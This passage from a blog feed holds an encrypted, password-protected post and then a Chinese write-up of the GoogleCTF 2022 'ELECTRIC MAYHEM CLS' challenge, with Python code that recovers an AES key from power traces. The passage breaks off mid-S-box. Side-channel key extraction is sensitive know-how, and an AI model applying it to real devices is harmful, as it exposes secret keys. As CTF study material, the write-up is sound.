6d7994833a4fc6997607233342f9c2464a803f85045a3d13a93cd4d4de45f686292f2bf8ca612b15a1cbf37fd1b698357cfd95fc73941270af528edb5ead6a715a65ccc2fda1ee946fc4708e98a7ec9de958418d008300d5173e73a7840f6dd90fc6433501c13ba4426354a504787d8903c76a18e95554651a9425553439639f648962669ad6aaec9a6c1530b9de4b7b4bf89119d07e1540ff6b965557802a39a982fc8b25ec48e069fc90f6a1bfc40f9429e0280cebcf2e66f35e9b5a973ed7ab19c19785a3a1861c9e863681b5770a6730b2bc1ffb268ed30d200ae3d1a3b8829f1cab87802ef66f0228051b4cc584797222f1b0a59a8db43d63816bd3a89ccef8a6f7a4eaf8aa6d0605584450999a538815165fe87b0c7f75adee341df150efad2e6fc864f820dc5975f46840c559a763173a658b694cfb289ebbeb81c9a31958824d5ee9dc80e19ab92af09438f2d5518bc415e3476eff58f4c64190936af749df7d05c51c7baa8801b15ef8aaa6c501c56e16dd784fec9a7d17386a6b708e197365177418cf522d54e17cd3e15bb30428db321455ad12c152a27d170a09b2bd419dc31b93c7c30d917787eeb14f8754dfa987284bf35dc7d5de693ec46fd207abc5a7a31d185d3902ebcf6d0e911cb4f07336c2a758c2ee4fb5a55194685f11fe7c10c09efc7ff4182e47ac7d07f8c05719ddf990b0c5e9159f72a63ff33a7e0f85def5389089bf28abe12efb7e86acd248ac0d3dee04d6c4902a010c6615b770f4b6453552c71a87ec4e4399769ba56fd85e8b8a725423288efda06afab1ada6d31992c42d935c60176aa2c587e92304663bfcd3ae824f0ed0210f0a76f66d970ce7c63f4a19229d68327ecd7db171f8dff246b0d18b2b2810fda0aa8964f49948b38778a4f9045b3ccf92fc34e30fcb30aa6712a05657b1271c156d7f14b6beb78e4d46bdb30259abb0be19e4e0c183b13eab7ccebce29a8bd3790b532018f3af509ad8e4fe0d4ea8ba136673b8cf646e8d41e971b5b1752c56a23ad39dd9169d0e5d35f32f2ec9476a3cec7a8ecddae59278ce4ef91d187386af7a2d16d85d585b9f8d18700cdaf78b5c9d99db639c9962a73d9bc7f0293827b2fa555bf6faa4cb7b4259c6a82aea3d43f01d17d722c99867de6ee317dce2bf10353362daadc3d69849d8616f5e88e1c84a30e77ff8e6d137dd7a0d1bb4b1167d76a0d5319223a20a47a4cb91d65a4e4be7189b7f1b904fe66e3f4c5bd56c057f3d40af4865c5060914a17b063eb8600b33c3363bcb9e7aad278d0872655b41de34b20ec442d68cd8667dc3c7fb4d640c52490210303db1a96d58444cd24351a71b64739664611a4588270f39456b1e7f785ba17208397f63a29f7feaf28973783102a1935b52b36e055a1a85b5039436e7c0bb24e078414f5d49ebdd6264c63f88acaf13e7bd7aa7d25c8478db2a746864bd95910e53c1dc57f255921b73f27bac3fc82c363f8da888812c68c8dfb3eb901d6927b9eb847d3db74f5f660f7cfaa38d43c2308536df298da4d9e9948986eeea7f6d31d895ad1bbdec46cd9538a913f92b9165f5b22db5a1c06fa5514644232623bccbb57ef0678f36ec742650d3b1435a922be1ade94d821701eeeea9c2cd904fae18c7362a897388ffbb563acd3dbf259bc802524de84b66aba5632acda8157ed6d79ce22510c4783c35796a421486c3a211a28fba1a37cc2bdb0695c4cdbb120ed5b410c49541a7042027bede49aef750865ecaa336f37c7d5e26fdbeb72468a510bbe434aee31aa4b4edeca86fa0522c2eaa9726814368da212083aa0ec80009185721de8cd2af56762d1b23c45f0edd037580324c52b460f06499ae4eb51e976e5745b613ccc3344ae9d20b4537287fe0dcc91b8395e7b7771099488957460bd559605c92e9822b591811b56e0b67b42ed65fe12bfe0d1f686332c94608d5218ffedfe5e8e96992cdd7feb194a968a95ed09d9143842fc223017abfafaf12e0864f9c3c03de98aff8e89f9e20d2df20da0fce93fafb7b07d95b82f91a569d6c8c36e69feca4665fa2275990f23381c18eb1fb55a49ecc3b004d9277fd520e60ed445d9bde5e368712c7be5abe0e17962b77335a45bdb7b1ae7821752b1f2422e97c60443c813d7b7731d7dc5f447dc7100f6e6b8c48eb717929cd55e8e82d735323b8c2b92ad0c8f05933c305c7755f3ce9f4b2cd7cc55c1a7abc146df530da7da464040592b733018793e29a148e55d83cd8a785386851d0bcc8dada66596baff205d8f70b598204627073d430af8fbab89e78a75752cdd1e452959f05ac184b641b78bcd27a2ad5394bce4816ae2785717ccc54b424acf9786aee658b823b9bbfe4de8602f05538fd521b9e066aca12c97cac2836a3fe4a885388b41249125d2fa9d384d942d7ed128a4f753def6961e2b5c9847dc56ae4d11bf6f65f0118a815d79bd12dd2057e2e45e746ec3029a25726a3f7caa6284d53d2344e94e7c8bae3a48b9de40194cc74532ba59ce7fd683ba6e578d0b4ec6ee4b74721a62cd721be70ce1d6ce31ad426a90e5e3ce84f560826755e82ab8674e8461c1ae047ded53bc6ed85c43d745534bb78e90fab044ac71407072f8ff1df5f61d2638c6f7b1980b2f56e2e00e7a80ca57327dff616dcd827b6c34ae9300e1cbfe61dd14c20257a45e231f4b268a9773b10d35e66d3a89c09d6b694014653b2ff6340888da9e3deadf39d6d6571ca8d5fcd304dbfd2feb6ad4c19c56698dbc4e85656491be3f1a8ca262969b36268c839bae1e7f2db642736e2a9c1512a4740062c20bb82ec5d925e2fe1dd783e18877b2faf1478df6190fca0c5db9e99511cbdffdfa75951d4047c2693dbbd5b880f4a310dee646a608b7bef24814edd4892d69dc010839d1b0a3aad7c9f371b0e109046dcbba9facf3a70b74b18362da0935f62c5cc4d327cd042546aebd53b8302a67a57a531cdf153da89ce933a12bf05f25b442d65037ccebabbdee9b88624379f77968e126e5f0c568ef557a4ae8c0af3ed1f023409d9826bca55b2ec2a6a8b2fa8afc06493661fd227a2f2e19813b73760ac219076395cb62856e99b33df24b546bb378a1a810cda9d7ceecc82903c79ce0da241e27c7ad87b039964408455b05220d3d7716b605e4fbae49fc01b477bade7e53a572f7cc8f62453304719b9ccb854437192ef79f180c609380fc4d949b7d9899254892ded6e66b228ab9e0f5220bb181e7747616a82f177c07df549e89a6365c1ffefc5186112731dfa25c1c5e3dd2ffdd0c45d508528d31ed1f8adc5eb9a5df1492591c4bc9c34d4b97023d17f6fc3445675e6d0286fd4cc71db7a5317bd9a27db17a3acc7db830fccecca4aa8bd5d28661e8967a5bdcdd511b9398c81e9dad5c29f60604a9ba640d2101478eca12a8a07dae5bd5fcfddde35de03d14cf5197f9ca1c3200f0b6b775bc44cccc73eb4bccdde5312f3c5f646de1b0a962220c26300aeb14bba90f8c6ec03b72f952c2520b332cd7aa56bbce95cd797f1a4f9393a85ccce81974b4cf041065b3b0af59ed7b5fc3b0d9c7bf3141c289d1aac0dfedcccca85c535297a343f61bf681a7b92804870fa32e8135bf9c8ef5e895d6e8e90e0f26af98f562a6d8ec728f387eef2047779f69192060ba56c496f282507fbf3bdea4a26ff6c8c616b4c1e463b0e93124a349baae545997390d3a99d1e4db1358ffc24a0c4a41934cecbcf9de4593bc51efc8cd57ae18741f4ce6c154a20bb39f00c8399a81a89b838d4d85384e85b4aa4d2911dc5cf54a5e0c82f0c26f4148b754671aa1f1fe9999301062caaac00c91253a767e666e68e81817ac0524a2f6be0670f7032423ab9a2e27d6db1fd24a9040c30d6ca5f623df2f13b498dbeaf04fba9114757584b18918ba53a815bf473c15027b773222a77ca97eecb444fe678289c44dc52862d435588d141957811f6d923734d802e6cd54d835b63359a140f1a260a78dbf4bc34ded56fffb480e022332a3861aec2091010cb38f199111d9a2aaa2a7da9de7fadf6622d4c39a5ae146802c1f5904666d96ebf6b69d83e317f079676fd06ac3b7ee349a745d3c41cb88ee0b2ae5b258ecd030a7a5123fb92b3f3d871d9d2b891369953458489e7d493e17f595fdd47525e96fe2a7c2a9bbd10933c21d127da2978c3fce6f3df5a77ddb30257e08e528952c5e1447d5a688cf543626915e3c7a37dbb8409c408049db3a9a2775a8491dc0be2e8ada821a2a45e97d6708bd6ed550866fa8778b29ca9b7fd1b84b3ce4152db864eefb5721154571232c17cd407148b16c8286fc29c351f232d038d2673d80676f7337a70b3280bbc65ad4f4082a4aa900b80ffcf9193536d1d2cdf2f4b1e1c3d9014ff87e1f32e25af7ab0ee15b6d5451f3b14a8981a18aa44bb5682372f613c9f26da1ed4965c19e0eeeedd47d0b7f782695e67244cbccbb1685749666c1b3f8d69128d99aa4064ca27ea95fc2e376938fb82c1d1aae1b490e8541561edb94b0e54d55cdf463bafca9610af0296a81e06dc1e1867f28ae393773059c70cc422847aadb84011b01807d7f8f7863f29b472fa8c474d58b49911803c874f25bd4a5e170544bf096f053858a2e34995625617e1f7d3287c12124459bba101dd2280b41f2e80ae36d9df0b7c1acc0eecdecd3c7fe77fb40cea4e0862e97ce15ff5ac4a376dbcae02992280f048c13262f17a58f7b59f97a1943b8eebcbe35084606e0bb59c635ed66fb82df4c0fe07a1da7949c10c2aa20df251436a1c0743d14e69388be8986539c30754f257786d1139efdf78c2eb01db9f8cd047a17f1027c5c1d98c3d6a236cc2fcc8ce0afd1cc12c026f8548ea7310088f6835c296fdeceef7bf3ef9fb0256bb1b3ca8fc63d4c6e29eadb2d96ac79e8a3ae7faf462e19b39b8932c8ab0df0122b1b07600f43a12408b98563595a6322bad07051e5ad9d2d41969b9dc0a8c29cf0ffc8de8b0a0d8c2c7177865829654b0bfc10632dd787fbc9dfc528815f44225b9c8204c9fd756f65d4735348f9c3fe725737c7f64aedfaabe4af5a2e868acc726b1f72e11dcee6cd98440551144d44b33091fa9a344244492cd4b0d47b01a391b523f4efe62811714c34e923d6eeaa9a415b65cc8af4e5538164bdb1206cbb2704e88632aa201922558dce2666312ddf357e9be4e64fec6e0c80d389d779978125de00e8c93ddb2833b940a5e060b970274ec49266381b97b2caf3030cb17c1684ab5a118f9c9523a22376012046f342e873db55f7bee0a3b1a774455b8c0750d77f0c614b2f32af11cc0cb7949ff4c28101ac6b39768795ae778b7666f3606df030d7f75d30d7add2ae7f8d5fdc1a73698c016794fa4fbd58e0a565f556d328d2a08d68bbe42e00086e0741a10acae7e37fde6d8d6aa71048d76452a74494533d4c325fcff476e131cabe701b96d49eb729a4e597d8382067a524f08e7ecae1087c810cc43a92b5d2e82c47e3132ad1dc7292536be834f5eafa8a69739ab793f8663f9545a412bb0f3937871245de74df985044fd7a0515192ad38f570771b6b58ea561d032fc24f451212d70d8de099f89b55dfbdc95abf1b4c62d8ab5645a36601b23e946d3b78e68747c84e9cf20e28df9976ff55f20a7e388c729bb7fa298c0db7acac16dfb8684ac730d61c47f680ed87caf8f09fc5f02012ab6c1d585fdc2197a4498881081d4944aa3895125055beea491b935f2956ac4e3dd7d0e254f6f607f03006b7da69a8336e0d4b58fa31d3da2e852fe5412becb8436f27237fe6a269d832376e8d0419c9dda666e0256c1e857034a329efb991d28eb14c9fe80d7a2eb40f8c078d827e2a8b5b12d293da6d5c8b2f52588b7e52bab436f3b96d92582c5889881671418f0028b931620e8ff4f26351cd1d25cb6c26f5ee677d400fcd58e3d00faed8a0615e188ae2c7cece71b6b00a7c72526f57891f7b9d60b7765f0ddf0c7e73b7ab3de321aeff4e5bbfc36104e5520668f8c88526e415fe01cb694a2ab3f4a492b5e6cfeadeed017548b41518642db8ecf47d5619875f00374c6ec730811f25e8c57745a3011e52b8629d1e950f7217136fbf6016dbcb5816797ec959ceeebda226f2501969d792236797eada3c60734c5a8aeeb9aaf1502d1f5f87fd823d825976c218a0a7b7bfcae9c726758f0b2e021d019afd5f39fd939ceed0f4bfa4e673a761facd79fdd4d893d6930a2fed5baae1ae794e5f572b913c2eb73dd422cb2ba3601dc53ee87386b899506990ac07ac5cc47cf6025fb0606a2c2231e2f9f07d8632d4524f84fb5c27a515f1b86b7c118cf3000ab56236e6c06b8b65ac8389c1573de3cd7c0033efbfe0849cf82e4c494b6acc23a11f0ab1fdfa56ac831d534d1153618622ed6afd52c9c5507b8be57226737fe5aa8a55de78469ef0ae3d25144289c50c98b95f799574851a9be5b0e29042f1a1a55401bf7e5732f5c44fc89c96bdd4f3d8ac84fbcc5fe0b73af98d655c8c3690d0797e908bc83280b4a4f2ac4b2c4a88fd3f372fb560529d28c413443667023ac86c75494e2c05dd5953868c030167f76881cc2e8f98170000e432ab0d5374996715c5cc90509077cb81572e9d515204b7704298fead16ba5372bbbc21e359b4b4dd2e3d2b2d5583bdabc9cf93e00911ce219b52107b1b6d8bd38528eabc7b6c4027adc1d925528ec4502cfa21cac8aaf5b9b33e4f852e3e4bd71de09dc2be367b0584b1548afb62d1773c895d2d15737559f3d1b7ff96eabb463ebac7e9afcb73110b4a380bd1ae84dc4ab91a98d008c4767338ab5af2e716580fffc574544e10b31652bfd6d24fec0e87c2abae077daeedf153586077b83f85c048a8b4b3944de4b2a9621bff159fcc536145d129c7574fe654f236ec5644ef1a1ae0e71279470b8eef4d634f94a3e7a1620a69466c530acaac760f36581d250e2998d82b7633a9491e67847e1327f4790135f0a4d5f3e16756799252a29abe27496dfce63719a42f87289c0c5ed79a5ebe43e183b9ba90fdeae917007a153868610b84c278c887d4f8b1ddf6899dcf2567e8bd03654b60a7c977bd50134aa3b32c7e639c4338ee4e8a70f32e57f99d64cd56bc94e5cea666bd864e8c35ccd4982d79f6fa61642c1f2a3e286cd8bca162e0ef4fa5b1a54c5bcbed5bda0ef6aed9bb68d97ea7283f15a43c7efe0da8bfacf06861e77ce7b4093885e2860a70f3220c0254be07bd2d7749aaf61c230e02e2f0f215e6bba6ad3b529851d115590003511d39bc70d7b30e5ae8e8926e920e6af8a61d5839e946a07a553022b3a1474f8da125f1e3cb8ea278530f789bcee905ec7a760c1ab9233788c05958e3982fe2c29bda0404ecf765fa4c01734c8428d8ed7eaba5584f6932b17b27f6cdbf595889e797e581ea6d742dc18043603a8ced8f6d3b8b76064a4022edc03d9729588ea840815d8bb44ae46eb050a695f07377aee2a8b64b3c13bd84a80bc8ea11efb9dffe33f5b9e3d21770fdbcaceb073d76e2b1cd257c259049a46e6df0b238d835585164c775e9c8937882f1e14d3ae54f8bd57741ed1200b03a16931db90a2f5b9f0f238e6bebb9bf0a9bc2bbc399452c38026cd9f455927d35bb7ecf78e47916ea0a407fcee9ef1107cc3f3194ef1d301c3592d6349c0a6e1defe87585b5b89db2724c1d5eff28eefe9a9ec784f166e3a625ec986fa762505d8c752d1ed074b5dbbe00176f1f1f38ecb2620ab1214eae50828442a45f633fea794ac4b44eed60c8041a8fbace80ce97fa37b8ec79661c62c4d6f3b4fef68cc1f15b5ff723430c50784def8b000b25dbd187a321de25a23a3729237a8c8ad9a8b4b2086b19fb635b3d0067b85b0fba6fcb8f87aabd5078cf29bda8fcf54221855dd95727f2ebb403103be20bc673172e61aa0165ea17591dd039551911c541e0489bb8d5fb567ffa414e93c3ed2f1f7625eb513e17f7b252b97da4dbc8a5fbf0060e21d67047343f8aa1f3293926b59b5ac110fd33e4e7cd1004e8111bdb3def2413e16d925e02643c98feac5678feee5689907b90a4cd9dfffb2a52f8304a20c31d487753b07ca77b3933821821feae2fd780168d898c1efabc82ceb8dd56d9eda79d609c2cd7aa835d3b6afd6853e4fdc99a2e5d397bab331cd889fba48c819581c398b0d34500f5c209ac7153ed4c3d2714d32ff8562fa47f4d7bba70f5df608786b9ffbf8bdbef267505ffe299c4517a5ae1c17a505d2d5a1a6f7aa256d49a74bc32efee1ffd9a4d01157bdaceeacbd8b40467c2b7ee1ed12a5e92f28a4b04b2ba4adf0bfc6e2c8da57aea4b263d69c4ccad6e3a260de169b82ecd856267543dec7e97069bb162856eaf0af6d4ad622a7b7d3c3ea2cc96d262a932b3e2b23ea9412a1c137cf4168370a0088cfafae2c3cf4096135c46c31e50228c12eeee456845aaefadb3d8c83f2058d631a487d9e2cc85d5ba4e5e5ae78ab8be9c27892969140bc75932cb83847083c27815344d914873915aec5febaa35d3a9e58c93d1869820d21ec3b757bde825291d81ec7c2433ebd97c77c819904f5f3fa39ab57c692b9bf699703d08866a8c6507372eac0fd65eba99b234f2cb026de26338a0b7a48c6dff79028a585a4d21a6153bd7255713ab351d1f808a8ff9b77618164fa321930104f12c1720f2c3056bfb29c131cf2bacfa3bb2e5cfde4938c81470b9b974a97314f52b5d0aedbfc22c12a8dfaa5e40824f205bc1e3daa15a0461922072a555360f6def0794e055e60a7f34ebd186d1b5df8f73e3787d61627124cf5bf6a768e5115dcdcb82e3c6b7224f6db69b974aa6b67f00502369c8a80033070f6be1b80ab6140a210995807bb75a2aa477f39afd6bef0232005864425afc8b114d993f1831aef7eeeaef5382adda37a08c57121faa223a92020b1c1b9e7f5799e500ba0907a134e15d3efd19f89f733f1935af53fb9221c362848288ca745dc6869420975e87a9e9bb31126656f58d561ca87c4db4c563e640ebff7cae3d2333db26d4a44489a0eb967c793b0995d4408fd5245aa846c9190622a038a0387114290a3309f81c6d5dea81bb4e579097bc4cb9da9ff265cd7fb302744200cda4dc7cf9cc6cd93818277895c433d4910aa32cd8010addfea6b234262178e6b2b33c3cc87999500e5f43017228a3f0c5d1280d1025f15c50c3e5098cbc1f37a9030637197725052ace2da0562bf23470f86a5c79fb9a2b68e1e92da52e97dab666a146631d0eb9043dc507ba4321f67495a44861c5044bfc9856fd363f533848e34b9d9978e525c2d36654f0464bb3f81de7018dff950574226e03b796fdf37385b16f68d074f35cc2a563e2a3fb549e9293112743eb568ab6bd11cde7dca8062b1e859508b644ef5d680173c0c76b4e04865928f270789e6061edb76de9e70b849e10f3665c027a45e1b3306ccc0fe96674bfe64ec4f3fbcd24ae6583f9fc712b1d4911b197fbfc1fbccda1fd9fbb79be01ceaac279fff9e8c9d00bf77d9a894ec1e29c08955abf8c08f3e6b102044b37a8d8d38be96b85309c3c522aa84cd5fd7181d4f080ca5b8fbe71dbbcf71d4bb597bb64c591cb09446a0005e7d914d8762d15a1bfa713f1896ba2c134842718299a1f37ee96eea304ad9c9233df6bf81641db7b3c001f0d50a8eb2e6e34e8efe4a85fa13b92c7242077ff8253f9a68e8cae9e9f49c874136f588a4461a739720b4cbc4b1ea898cccd84292663609e2ffe5cf57d996872c3bb486ad51f63bdd221f380d9f4387a69a8a18acb43072c71f59eb5e1e94696e8ea2416f7ae8781155548fea6f06744dd1cc6f5b4b7cdd1f3d009a86cfa1e3a2091ac0ab256b0e46f2a334cdc9646aa837f92461053b87105cd3b5e7f25c10d4aef605e716207fc09add7481c9052d872c0ebc799910eb38621664b37df74e78212b9bc07e6c73feb498005a1b98ac630a445de62137ff5a3f1d910b2248ddb8eaf4b7f24fd26ce3def9ed0739ecffab1eb7f4e4c299b94abe4c760419bd803a5b470c899ff8921775ca0e78ef982d52c120c6c87fc79c5be1dfece9df42a11cd61327401b4f72c9ff3258e420edba02274d581c7765b6d5518f35922e88be317e41a608c7cc598841993a436fbe0015d1d04eccc98c3b72411b82f13ebfbb13be6c2c23054d4ed96d4dcc49d6547fa1d669c1d96262a0b3b22b3dc2624c6fc2675a163ef82eb77fdeb082f4ec2f190821217afed72b26deae14baa302154e8c68a311e813e9682f15a7755776fc3f7c0958b8b29fcecbd8d87b0c765c91782dd42188a816ed3694ecc22e6650d0d8b21ae598ed243792a8abf1b53c8628a28d514bcee3b552a315e77b49a3e82bb98cc0c44f065423edb52d7a4366e2b2a9996010e14f6f2a5a02335f2bdb21ed81d45d5bdfc51f23cb71322ae5016d7983aebc3b5188a0ed559ccfcf86b82638a0a86231df4821f82ae070b8830a1362066e5060216a514de86bcf1da38524fc079a0181e95cc484a7dc9d3375032ffc424f35b08de873c24bb10258011de94baf7f766c2113e42df664cd13edfc9df3d3c83fc1580d79ae904e8432306780ce99af6c2f9735efdaeac44659694558aa07cadaf279915f1660192b0fcd3612b2b46d75602bb948cab208a3d1fb0a0a1e6a9f349db93bb5a85ee1605de9360070b5d7c60834b22384f40ff345395c57012fcf8654fc0d9e1767e7474423d54bb353a30898b4554993494ad96525572f84eaafea3d4c802d66ee3b06f93e386d47ec432ca65099c38db1e672fbe581301483fc35df5dbc3b15e2d299f6275241d3e1461a0d8576923ccd8daeee0845eecb558403b3104b131f9bc5f4a608d64fb894706098c9323db1b28085e6483067dcbb432e1f44e533d7b6a3e0700b469e2249aaf4a7d7776151f815281041b48a485943405d33c7250eb1ef975e4f929caf931667638b654815f8d5de6ef1e88e585b870b880d3eed052f84eeb6429f336a2a139d2206d640da9da17fc072283a5c08a0883728e44e19b51c6eb6b4a9b727f1635d826c9b2427f574c4f6f1fb3b5dd79f468de624d521677da524b2f4edd86c71330c641808546870dfa05b692e5d67d647dda3ac1bad6056f019d3596e6621679aaca23f68a6b29b258576d30736e97c789326566d41ba3b5fdf15702fe77c4da3b3ba9bfefb1e9a5dccd9bfdc432dd5fa0cd56361409941f84af5149e36a3466e68bbc5dd3c09ea438746ba3435291acf49b045750cd9eb4f11dbaa017e387c6f9776e3775f7740677049fcc4c2dd618aec62ecd1e10afabfc6edc33e7883f4d567c0dd684395091245d503608cc19a5c58a55afae95605469fdbfbde575c1b0696c9d31c54e8187912e4b715105cc4718a7aa360ee33b8a3262d3b351d312834dc1d71c95fde18ad340acb8e92ac8fabbb834ce209f980be495edbe754f534b1000f2ea51a2c187233be9dc1b0e20bd2faa5cf2866d0d91d7a882dc1d3e0ef8f6c884ca11becd5f3e3cced77683847425ae0233a88e39a4728d2792812e163d42b0c39ea0a77b74cbdaec79577653f1415c97a4ac115e05ff51a81672009410e63e92b0535910849775f0664b18499b6646c3e93f67e3bd07c354b1fe652ea84fb719086217b5f4b321f0616444037775418b8fd9cc2246153380bb1738b1c8e0fb8cad6c7dea691ddaa5ee17da009a6f029aba7cfad3347763524ab728595dc67f73fe497e3e5e7fbeae62a37e13b8e8c2d1a2c00676797996b7da46560fce12c1f1059e8d125b65d298bdda93cf2c8cc41063776ad4276dd1b5c3f812f5b84598cad336f12f9eb09e9863630221ccc9ae05291a9fbc6a3a93c6679e67c46b38bf8935d2807c9e831cbaee6b6a1ca437b6fa811ab4a3af90ec919fc40d060323aa05d856c1a481ae1383cad28ea30e093833b12161e57c198f06bedff91ace67e050f5b6a3d6d1adc0ce62dceb38db52a74caa18246c8ee7ced8654e136dd7ff9308c87b121d4d7d9ffa9825599b0f3d35d5a46890392b7dada74ec9b080b88b98e77e7ecc10b595724d41c6ceec7464fab6bdee86ada3ccf43b55918a2389e52c29145350997bc5f55d51437f770fdda7ac5ddfb04bd07d937ad05ba3a4ab54567ed3f108690c8c6302c2238f6d85288ddccb60d00d0ed6ab8e9f5f167a6593b4a1c666f38612c0e4e852c584a2ca25b9c2888d6b932988c9211077dd5c173a20d42686d312cd38c3a01809709d42c5000c40f2bca72a69f41c7df0922dd5bc99cd95b479f0a8f6f265d822fff2c310f0ef8676f55d5babb7a5c8820239e0157bdaa498f84f4c4ca212441705b46a24d8fcaa2af3e84ecada687e4c458540cad91871f0d3fe49e26a38b585861cbc4e5c316ce97bf265cf072769252</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF2022·Crypto 复现</title>
      <link href="/2022/07/12/GoogleCTF2022%C2%B7Crypto%20WP/"/>
      <url>/2022/07/12/GoogleCTF2022%C2%B7Crypto%20WP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022GoogleCTF·密码复现"><a href="#2022GoogleCTF·密码复现" class="headerlink" title="2022GoogleCTF·密码复现"></a>2022GoogleCTF·密码复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>复现参考<a href="https://github.com/google/google-ctf/tree/master/2022">官方仓库</a></p></blockquote><p>很遗憾，虽然很热血、满怀激情地熬夜打比赛</p><p>但被虐的体无完肤，48h队伍0解</p><p>「何时才能登陆梦中的彼岸」</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220705065825288.png" alt="FLAG"></p><h2 id="ELECTRIC-MAYHEM-CLS"><a href="#ELECTRIC-MAYHEM-CLS" class="headerlink" title="ELECTRIC MAYHEM CLS"></a>ELECTRIC MAYHEM CLS</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p>The server presents power traces of a secret firmware crypto operation. The goal is to recover the secret key. Note, the flag is ‘CTF{XXX}’ where XXX is your recovered key.</p></blockquote><ul><li><p>文件</p></li><li><p>链接</p><p><a href="https://electric-mayhem-cls-web.2022.ctfcompetition.com/">https://electric-mayhem-cls-web.2022.ctfcompetition.com</a></p></li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p>学习参考<a href="https://zenn.dev/kurenaif/articles/ae83691511b966">密码魔女的wp</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220705180147886.png" alt="image-20220705180147886"></p></blockquote><p>真是糟糕，🧙‍♀️抄的别的师傅的<a href="https://trmr.hatenablog.com/entry/2018/03/18/220441">分析代码</a>（也是日本的师傅）</p><p>🧙‍♀️懂不懂原理我不知，但她确实没讲清楚</p><p>涉及“电力解析”，在我看来是很偏的知识点，不具备普适性，暂且搁置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ref: https://trmr.hatenablog.com/entry/2018/03/18/220441</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">import</span> json</span><br><span class="line"><span class="attribute">import</span> numpy as np</span><br><span class="line"><span class="attribute">import</span> matplotlib.pyplot as plt</span><br><span class="line"><span class="attribute">import</span> scipy.io as sio</span><br><span class="line"><span class="attribute">from</span> Crypto.Cipher import AES</span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"><span class="attribute">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="attribute">humming</span> =<span class="meta"> [bin(n).count(&quot;1&quot;) for n in range(256)]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">json_open</span> = open(&#x27;ELECTRIC MAYHEM CLS/stm<span class="number">32</span>f<span class="number">0</span>_aes.json&#x27;, &#x27;r&#x27;)</span><br><span class="line"><span class="attribute">json_load</span> = json.load(json_open)</span><br><span class="line"></span><br><span class="line"><span class="attribute">sbox</span> = (</span><br><span class="line">    <span class="attribute">0x63</span>, <span class="number">0</span>x<span class="number">7</span>c, <span class="number">0</span>x<span class="number">77</span>, <span class="number">0</span>x<span class="number">7</span>b, <span class="number">0</span>xf<span class="number">2</span>, <span class="number">0</span>x<span class="number">6</span>b, <span class="number">0</span>x<span class="number">6</span>f, <span class="number">0</span>xc<span class="number">5</span>, <span class="number">0</span>x<span class="number">30</span>, <span class="number">0</span>x<span class="number">01</span>, <span class="number">0</span>x<span class="number">67</span>, <span class="number">0</span>x<span class="number">2</span>b, <span class="number">0</span>xfe, <span class="number">0</span>xd<span class="number">7</span>, <span class="number">0</span>xab, <span class="number">0</span>x<span class="number">76</span>,</span><br><span class="line">    <span class="attribute">0xca</span>, <span class="number">0</span>x<span class="number">82</span>, <span class="number">0</span>xc<span class="number">9</span>, <span class="number">0</span>x<span class="number">7</span>d, <span class="number">0</span>xfa, <span class="number">0</span>x<span class="number">59</span>, <span class="number">0</span>x<span class="number">47</span>, <span class="number">0</span>xf<span class="number">0</span>, 